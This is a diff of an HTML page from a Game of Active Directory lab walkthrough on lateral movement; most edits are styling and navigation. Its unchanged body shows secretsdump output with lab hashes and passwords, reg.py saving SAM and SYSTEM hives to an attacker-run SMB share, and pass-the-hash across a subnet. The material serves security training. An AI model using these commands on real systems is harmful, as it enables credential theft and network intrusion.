@@ -3,143 +3,36 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Part 8 - Lateral Movement - GOAD</title>
+  <title>Part 8 - Lateral move AKA pivoting - Done - GOAD</title>
   <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
   <style>
-    .goad-nav {
-      padding: 20px;
-      max-height: calc(100vh - 200px);
-      overflow-y: auto;
-    }
-    .goad-nav h3 {
-      color: #ffdb70;
-      margin-bottom: 15px;
-      font-size: 1.1rem;
-      border-bottom: 2px solid #3a3a3a;
-      padding-bottom: 10px;
-    }
-    .goad-nav a {
-      display: block;
-      padding: 10px 15px;
-      margin: 5px 0;
-      color: #d6d6d6;
-      text-decoration: none;
-      border-radius: 6px;
-      font-size: 0.9rem;
-      transition: all 0.2s;
-      border-left: 3px solid transparent;
-    }
-    .goad-nav a:hover {
-      background: #2a2a2a;
-      color: #ffdb70;
-      border-left-color: #ffdb70;
-    }
-    .goad-nav a.active {
-      background: #2a2a2a;
-      color: #ffdb70;
-      border-left-color: #ffdb70;
-      font-weight: 600;
-    }
-    .page-nav {
-      display: flex;
-      justify-content: space-between;
-      margin: 30px 0;
-      padding: 20px 0;
-      border-top: 1px solid #2a2a2a;
-    }
-    .nav-btn {
-      background: #2a2a2a;
-      color: #ffdb70;
-      padding: 10px 20px;
-      border-radius: 6px;
-      text-decoration: none;
-      transition: all 0.2s;
-    }
-    .nav-btn:hover {
-      background: #ffdb70;
-      color: #1a1a1a;
-    }
-    /* Notion content styling */
-    .notion-content {
-      line-height: 1.6;
-    }
-    .notion-content img {
-      max-width: 100%;
-      height: auto;
-      margin: 20px 0;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-    }
-    .notion-content h1 {
-      font-size: 1.8rem;
-      margin: 30px 0 20px;
-      color: #fafafa;
-      border-bottom: 2px solid #ffdb70;
-      padding-bottom: 10px;
-    }
-    .notion-content h2 {
-      font-size: 1.5rem;
-      margin: 25px 0 15px;
-      color: #fafafa;
-    }
-    .notion-content h3 {
-      font-size: 1.3rem;
-      margin: 20px 0 10px;
-      color: #fafafa;
-    }
-    .notion-content p {
-      margin: 15px 0;
-      color: #d6d6d6;
-    }
-    .notion-content ul, .notion-content ol {
-      margin: 15px 0 15px 30px;
-    }
-    .notion-content li {
-      margin: 5px 0;
-      color: #d6d6d6;
-    }
-    .notion-content code {
-      background: #2a2a2a;
-      padding: 2px 6px;
-      border-radius: 4px;
-      font-family: 'Courier New', monospace;
-      color: #ffdb70;
-    }
-    .notion-content pre {
-      background: #1e1e1e;
-      border-left: 4px solid #ffdb70;
-      padding: 15px;
-      margin: 20px 0;
-      border-radius: 0 8px 8px 0;
-      overflow-x: auto;
-    }
-    .notion-content a {
-      color: #ffdb70;
-      text-decoration: underline;
-    }
-    .notion-content strong {
-      color: #fafafa;
-      font-weight: 600;
-    }
-    .notion-content figure {
-      margin: 20px 0;
-    }
-    .notion-content figcaption {
-      display: none;
-    }
-    .notion-content summary {
-      font-weight: 600;
-      color: #ffdb70;
-      cursor: pointer;
-      padding: 10px 0;
-    }
-    .notion-content summary:hover {
-      color: #fafafa;
-    }
+    .goad-sidebar { padding: 20px; }
+    .goad-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .goad-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .goad-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .goad-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .page-nav { display: flex; justify-content: space-between; margin: 30px 0; padding: 20px 0; border-top: 1px solid #2a2a2a; }
+    .nav-btn { background: #2a2a2a; color: #ffdb70; padding: 10px 20px; border-radius: 6px; text-decoration: none; transition: all 0.2s; }
+    .nav-btn:hover { background: #ffdb70; color: #1a1a1a; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1 { font-size: 1.8rem; margin: 30px 0 20px; color: #fafafa; }
+    .notion-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: #fafafa; }
+    .notion-content h3 { font-size: 1.3rem; margin: 20px 0 10px; color: #fafafa; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+    .notion-content em { font-style: italic; }
+    .notion-content figure { margin: 20px 0; }
+    .notion-content figcaption { display: none; }
   </style>
 </head>
 <body>
@@ -160,21 +53,21 @@
       </div>
       <div class="sidebar-info_more">
         <div class="separator"></div>
-        <div class="goad-nav">
+        <div class="goad-sidebar">
           <h3>Sections</h3>
           <a href="overview.html" class="">Overview</a>
-          <a href="part-01.html" class="">Part 1 - Reconnaissance and Scan</a>
-          <a href="part-02.html" class="">Part 2 - Finding Users</a>
-          <a href="part-03.html" class="">Part 3 - Authenticated Enumeration</a>
-          <a href="part-04.html" class="">Part 4 - Network Poisoning and NTLM Relaying</a>
-          <a href="part-05.html" class="">Part 5 - ADCS - ESC1 to ESC16</a>
-          <a href="part-06.html" class="">Part 6 - MSSQL</a>
-          <a href="part-07.html" class="">Part 7 - Privilege Escalation</a>
-          <a href="part-08.html" class="active">Part 8 - Lateral Movement</a>
-          <a href="part-09.html" class="">Part 9 - Delegations</a>
-          <a href="part-10.html" class="">Part 10 - ACL</a>
-          <a href="part-11.html" class="">Part 11 - Abusing Trusts</a>
-          <a href="part-12.html" class="">Part 12 - Having Fun</a>
+          <a href="part-01.html" class="">Part 1</a>
+          <a href="part-02.html" class="">Part 2</a>
+          <a href="part-03.html" class="">Part 3</a>
+          <a href="part-04.html" class="">Part 4</a>
+          <a href="part-05.html" class="">Part 5</a>
+          <a href="part-06.html" class="">Part 6</a>
+          <a href="part-07.html" class="">Part 7</a>
+          <a href="part-08.html" class="active">Part 8</a>
+          <a href="part-09.html" class="">Part 9</a>
+          <a href="part-10.html" class="">Part 10</a>
+          <a href="part-11.html" class="">Part 11</a>
+          <a href="part-12.html" class="">Part 12</a>
         </div>
         <div class="separator"></div>
         <ul class="contacts-list">
@@ -201,14 +94,14 @@
 
     <div class="main-content">
       <article class="about active" data-page="about">
-        <header class="h2 article-title">Part 8 - Lateral Movement</header>
+        <header class="h2 article-title">Part 8 - Lateral move AKA pivoting - Done</header>
         <div class="page-nav"><a href="part-07.html" class="nav-btn">← Previous</a><a href="part-09.html" class="nav-btn">Next →</a></div>
         <section class="about-text notion-content">
-          <details open=""><summary><mark class="highlight-default_background"><strong>GOAD - part 8 - Lateral move AKA pivoting - Done</strong></mark></summary><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8030-b707-dce4fc5e3b72" class=""><strong>Pivoting</strong> or <strong>lateral movement</strong> is a set of techniques used during a penetration test or Red Team campaign. It consists of using a machine controlled by the attacker as a bounce box, to gain further access to the network.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80f1-adcc-d4a0dbac2611" class="">Before we try to do a lateral movement or pivoting, It is really important that we get all the secrets that the just owned machine has to offer us. Talking about Windows, we do have lots of secrets stored and they can also be found in different places.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8062-9174-d3e9f991706b" class="">
+          <summary><mark class="highlight-default_background"><strong>GOAD - part 8 - Lateral move AKA pivoting - Done</strong></mark></summary><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8030-b707-dce4fc5e3b72" class=""><strong>Pivoting</strong> or <strong>lateral movement</strong> is a set of techniques used during a penetration test or Red Team campaign. It consists of using a machine controlled by the attacker as a bounce box, to gain further access to the network.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80f1-adcc-d4a0dbac2611" class="">Before we try to do a lateral movement or pivoting, It is really important that we get all the secrets that the just owned machine has to offer us. Talking about Windows, we do have lots of secrets stored and they can also be found in different places.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8062-9174-d3e9f991706b" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d9-b7b4-e9af1a1e8242" class="">We can start by using secretsdump.py from <a href="https://github.com/fortra/impacket">Impacket</a> to retrieve these secrets.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8082-bbf8-fb707075c1b9" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b3-adf1-c99b30014f15" class="">Note: to be able to use <a href="http://secretsdump.py">secretsdump.py</a> we need to be have Administrators Rights. In this case have access to the Administrator account, or at least to be on hold of a user with Administrator Rights.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8021-ba05-f48f45458b15" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80cd-9b3d-e8e8fd4a3086" class="">We can use Netexec to find out if our user is an Administrator in the target machine.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d0-9b41-f238abea4f20" class=""><code>netexec smb 10.4.10.22 -u &#x27;jeor.mormont&#x27; -p &#x27;_L0ngCl@w_&#x27;</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8070-97d2-dc015e423dcb" class="image"><a href="images/image-328.png"><img style="width:2466px" src="images/image-328.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b3-89df-f0c420246d46" class="">We can see from the screenshot above that, user <code>Jeor.mormont</code> is an administrator in the machine 10.4.10.22, because Netexec output returned with a (Pwn3d!) in yellow.<br/>It means that we are an administrator in this machine.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8041-b5ce-f2d92fa95261" class="">
-</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8021-b72f-f2dd102fa531" class="">OK, now that we do know that we do have a valid administrator account with us, we can now use <a href="http://secretsdump.py">secretsdump.py</a> to retrieved the secrets of the target machine.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807b-8ad5-de6a95c2a667" class=""><code>s</code><code><a href="http://ecretsdump.py/">ecretsdump.py</a></code><code> north/jeor.mormont:&#x27;_L0ngCl@w_&#x27;@10.4.10.22</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="30c79e9a-d7c9-8013-bc92-f6f44238a681" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
+</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8021-b72f-f2dd102fa531" class="">OK, now that we do know that we do have a valid administrator account with us, we can now use <a href="http://secretsdump.py">secretsdump.py</a> to retrieved the secrets of the target machine.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807b-8ad5-de6a95c2a667" class=""><code>s</code><code><a href="http://ecretsdump.py/">ecretsdump.py</a></code><code> north/jeor.mormont:&#x27;_L0ngCl@w_&#x27;@10.4.10.22</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8013-bc92-f6f44238a681" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
 
 [*] Service RemoteRegistry is in stopped state
 [*] Starting service RemoteRegistry
@@ -244,7 +137,7 @@ NL$KM:10a01429cde3435824372b048f67cdf38a962f6edda9f4c33e4bcb66faf65f17dbe3878d42
 north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
 [*] Cleaning up... 
 [*] Stopping service RemoteRegistry</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807f-acae-e1208e81c30f" class="">Above we see <a href="http://secretsdump.py">secretsdump.py</a> output and we can see that it retrieved lots of secrets/credentials/hashes. Let’s talk about each one of them!</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8058-975b-e18209cbfd91" class="">
-</p></div><div style="display:contents" dir="auto"><h1 id="30c79e9a-d7c9-809e-8b03-fa32ef2de240" class=""><strong>Security Account Manager (SAM) Database</strong></h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8037-8a90-f4dc7da65a55" class="">The Security Account Manager (SAM) is a database that is present on computers running Windows operating systems that stores user accounts and security descriptors for users on the local computer.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806c-9d15-f4ac404cca8a" class="">The first think <a href="http://secretsdump.py">secretsdump.py</a> will be dumping is the SAM.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="30c79e9a-d7c9-80eb-a9b6-f93a50e0c116" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+</p></div><div style="display:contents" dir="auto"><h1 id="30c79e9a-d7c9-809e-8b03-fa32ef2de240" class=""><strong>Security Account Manager (SAM) Database</strong></h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8037-8a90-f4dc7da65a55" class="">The Security Account Manager (SAM) is a database that is present on computers running Windows operating systems that stores user accounts and security descriptors for users on the local computer.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806c-9d15-f4ac404cca8a" class="">The first think <a href="http://secretsdump.py">secretsdump.py</a> will be dumping is the SAM.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-80eb-a9b6-f93a50e0c116" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -254,11 +147,11 @@ vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b::
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-800e-a14b-d1ba18d96e2e" class="">1ST WAY</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801e-b22d-d3ea45b8f055" class="">First we start an SMB Server on our local machine to save the results locally.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b3-836f-ddb2942aba72" class=""><code>smbserver.py -smb2support share .</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8015-b8bf-ffefaa6afac2" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-808f-a523-d74d7dd2ab57" class="">Then we can use <a href="http://reg.py">reg.py</a> from <a href="https://github.com/fortra/impacket/blob/master/examples/reg.py">Impacket</a> to make the SAM &amp; SYSTEM requests.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-802a-a60d-f303c2cde991" class=""><code><a href="http://reg.py/">reg.py</a></code><code> north/jeor.mormont:&#x27;</code><em><code>L0ngCl@w</code></em><code>&#x27;@10.4.10.22 save -keyName &#x27;HKLM\SAM&#x27; -o &#x27;\\10.4.10.1\share&#x27;</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-804a-a380-e8d2c245f336" class=""><code><a href="http://reg.py/">reg.py</a></code><code> north/jeor.mormont:&#x27;</code><em><code>L0ngCl@w</code></em><code>&#x27;@10.4.10.22 save -keyName &#x27;HKLM\SYSTEM&#x27; -o &#x27;\\10.4.10.1\share&#x27;</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80f8-8d40-c3eb1bb3fe93" class="image"><a href="images/image-329.png"><img style="width:2551px" src="images/image-329.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8046-ad5c-c996c120e6a3" class="">We can see above that we were able to retrieve SAM &amp; SYSTEM manually with this first option.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d4-b6c1-cc478fb1d294" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8012-a6c1-dd60f6b3ca56" class="">2ND WAY</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80cd-a30a-e2b7e1a54fed" class="">If we do have already a valid windows remote sessions, via RDP or in any kind of powershell remote session for example, we can use the commands and retrieve the SAM &amp; SYSTEM.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8008-a784-d65a8eaac29f" class=""><code>reg save HKLM\SAM C:\SAM</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8062-9576-e1d80b988553" class=""><code>reg save HKLM\SYSTEM C:\SYSTEM</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-802d-ac54-fbc575da9dcb" class="image"><a href="images/image-330.png"><img style="width:2542px" src="images/image-330.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d4-b620-fb428689a684" class="">We can see above that we were able to gather the <strong>SAM</strong> and <strong>SYSTEM</strong> and save them in the windows root directory <code><strong>C:\</strong></code>.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-804f-a6b1-df32b3151f5f" class="">Holding the SAM &amp; SYSTEM with us we can use secretsdumps.py to decrypt <strong>LM</strong> and <strong>NT</strong> hashs  offline stored in the SAM database because The SAM database contains all the local accounts</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806b-b690-ca1037d2fd49" class="">
-</p></div><div style="display:contents" dir="auto"><h2 id="30c79e9a-d7c9-8028-9c8f-fa729a1b7335" class="">Decrypting LM &amp; NT offline using secretsdump.py</h2></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801b-8e28-df0156936a40" class=""><code><a href="http://secretsdump.py">secretsdump.py</a></code><code> -sam SAM -system SYSTEM LOCAL</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="30c79e9a-d7c9-802d-8941-fc4ef69926c1" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+</p></div><div style="display:contents" dir="auto"><h2 id="30c79e9a-d7c9-8028-9c8f-fa729a1b7335" class="">Decrypting LM &amp; NT offline using secretsdump.py</h2></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801b-8e28-df0156936a40" class=""><code><a href="http://secretsdump.py">secretsdump.py</a></code><code> -sam SAM -system SYSTEM LOCAL</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-802d-8941-fc4ef69926c1" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:fc1040929894fbc7780e0ecd8cb188d4:::
-vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8004-a750-e2f9654c03a0" class="">Please be aware of the following format of the hashes.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-805a-84d5-ddc0051bb3f2" class=""><code>&lt;Username&gt;:&lt;User ID&gt;:&lt;LM hash&gt;:&lt;NT hash&gt;:&lt;Comment&gt;:&lt;Home Dir&gt;:</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8013-b0a8-c43bb97566a1" class="">Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="30c79e9a-d7c9-807c-8d23-c88e3567f0b7" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8004-a750-e2f9654c03a0" class="">Please be aware of the following format of the hashes.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-805a-84d5-ddc0051bb3f2" class=""><code>&lt;Username&gt;:&lt;User ID&gt;:&lt;LM hash&gt;:&lt;NT hash&gt;:&lt;Comment&gt;:&lt;Home Dir&gt;:</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8013-b0a8-c43bb97566a1" class="">Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-807c-8d23-c88e3567f0b7" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
 user: Administrator
 RID : 500
 LM hash : aad3b435b51404eeaad3b435b51404ee (this hash value means empty)
@@ -267,7 +160,7 @@ NT hash : dbd13e1c4e338284ac4e9874f7de6ef4 (this is the important result here)</
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8070-9182-cc952dd631c4" class="">Now let’s do the Pass The Hash again, but this time we exclude the<code>--local-auth</code>. </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8068-a047-fe470e85858d" class=""><code>netexec smb 10.4.10.0/24 -u &#x27;administrator&#x27; -H &#x27;dbd13e1c4e338284ac4e9874f7de6ef4&#x27;</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-803d-8c32-f9c448b4f9cd" class="image"><a href="images/image-334.png"><img style="width:2276px" src="images/image-334.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803b-80a4-d17c1455fa05" class="">This time we can see that not only <strong>Castelblack</strong> was <strong>(Pwn3d!)</strong> but also <strong>Winterfall! </strong>The reason for that is because without the use of the flag<code>--local-auth</code>, the Pass The Hash attack will be using the user and password as a domain account and not as a local machine account.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ae-90ee-c35515c69a71" class="">The password reuse between <strong>Castelblack</strong> and <strong>Winterfell</strong> give us the domain administrator power on the north domain.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8032-8618-d1cac7333bc8" class="">
 </p></div><div style="display:contents" dir="auto"><h1 id="30c79e9a-d7c9-8023-9227-d9c7ea396cfb" class=""><strong>LSA (Local Security Authority) Secrets and Cached domain logon information</strong></h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a4-80f3-eb30eb1d8ba8" class="">When your computer is enrolled on a windows active directory you can logon with the domain credentials, but when the domain is unreachable you still can use your credentials even if the domain controler is unreachable. This is due to the cached domain logon information who keep the credentials to verify your identity.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803a-b0e8-efc322e3cf29" class="">This is stored on <code><strong>C:\Windows\System32\config\SECURITY</strong></code> (<strong>HKLM\SECURITY</strong>)</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-800c-bacd-ff9f8133eb0c" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8088-9285-c050bc2d2a04" class="">We will need the system file located at <code>C:\Windows\System32\config\SYSTEM</code> and is available on the registry at <code><strong>HKLM/SYSTEM</strong></code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806b-a974-e1edb583b91a" class="">First we start an SMB Server on our local machine to save the results locally.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80bd-8bcb-d374b80d08a0" class=""><code>smbserver.py -smb2support share .</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8085-b178-cf7c00ab5070" class="">
